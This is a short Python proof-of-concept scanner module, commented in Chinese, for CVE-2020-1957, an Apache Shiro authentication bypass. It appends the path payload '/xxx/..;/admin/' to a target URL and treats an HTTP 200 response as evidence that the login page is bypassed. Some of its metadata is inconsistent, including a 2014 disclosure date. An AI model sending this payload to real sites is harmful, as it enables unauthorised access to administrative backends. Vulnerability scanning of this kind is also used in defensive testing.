import requests
import re
from lib import config

class POC:
    #PoC信息字段，需要完整填写全部下列信息
    pocName='scanner/shiro/CVE-2020-1957'
    version = '1'               #PoC版本，默认为1
    author = 'haochen'          #此PoC作者
    vulNum = 'CVE-2020-1957'    #漏洞编号
    vulDate = '2014-11-03'      #漏洞公开日期
    createDate = '2020-01-13'   #编写PoC日期
    updateDate = '2020-01-13'      #更新PoC日期，默认与createDate一样
    name = 'shiro 未授权访问漏洞'#PoC名称
    appName = 'shiro'#漏洞应用名称
    appVersion = '12'#漏洞影响版本
    vulType = '未授权访问'#漏洞类型
    desc = '''可以绕过登陆界面，直接进入网站后台'''#在漏洞描述填写
    install_requires = []#PoC依赖的第三方模块，尽量不要使用第三方模块，必要时参考后面给出的参考链接
    pocDesc = '''通过访问http://127.0.0.1:8080/xxx/..;/admin/可绕过登陆界面，直接访问网站后台'''#在PoC用法描述填写

    def scanner(url):
        target = url
        head = config.Pack
        payload = '/xxx/..;/admin/'
        if re.match('/$',url):
            url=url[0:len(url)-1]
        url = url + payload
        try:
            response = requests.get(url,headers=head)
            if response.status_code == 200:
                print(target+' have this loop')
            else:
                print(target+' do not have this loop')
        except:
            print(target+' is error')
       

    def attack():
        return 0